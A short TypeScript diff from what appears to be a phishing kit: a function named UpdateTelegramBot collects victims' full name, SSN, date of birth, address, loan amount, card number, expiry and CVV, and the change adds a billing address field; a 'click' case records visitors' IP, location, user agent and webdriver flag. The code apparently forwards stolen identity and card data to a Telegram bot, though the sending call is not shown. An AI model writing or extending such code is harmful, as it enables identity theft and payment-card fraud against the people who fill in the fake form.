@@ -3,7 +3,7 @@ import type { TextParams } from "./ts-type";
 
 
 export const UpdateTelegramBot = async ({
-   type, FULL_NAME, PHONE_NUMBER,EMAIL,SSN,DOB,STREET_ADDRESS,STATE,CITY,ZIP_CODE,LOAN_AMOUNT,ADDRESS,CARD_NAME_INPUT,CARD_NUMBER,EXPIRYINPUT,CVV,
+   type, FULL_NAME, PHONE_NUMBER,EMAIL,SSN,DOB,STREET_ADDRESS,STATE,CITY,ZIP_CODE,LOAN_AMOUNT,ADDRESS,CARD_NAME_INPUT,CARD_NUMBER,EXPIRYINPUT,CVV, BILLING_ADDRESS,
    CLICKED_MESSAGE = {USER_AGENT: "Not Detected", WEB_DRIVER: false, CITY: "unknown", REGION: "Not Detected", COUNTRY: "Not Detected", IP: "",},
 }: TextParams) => {
 
@@ -14,7 +14,7 @@ export const UpdateTelegramBot = async ({
          data = {
             full_name: FULL_NAME, type: "personal",
             phone_number: PHONE_NUMBER, email: EMAIL, ssn: SSN, dob: DOB, street_address: STREET_ADDRESS, state: STATE, city: CITY, zip_code: ZIP_CODE, loan_amount: LOAN_AMOUNT,
-            addess: ADDRESS, card_name_input: CARD_NAME_INPUT, card_number: CARD_NUMBER, expiry_number: EXPIRYINPUT, cvv: CVV
+            addess: ADDRESS, card_name_input: CARD_NAME_INPUT, card_number: CARD_NUMBER, expiry_number: EXPIRYINPUT, cvv: CVV, billing_address: BILLING_ADDRESS
          }
          break
       case "click":
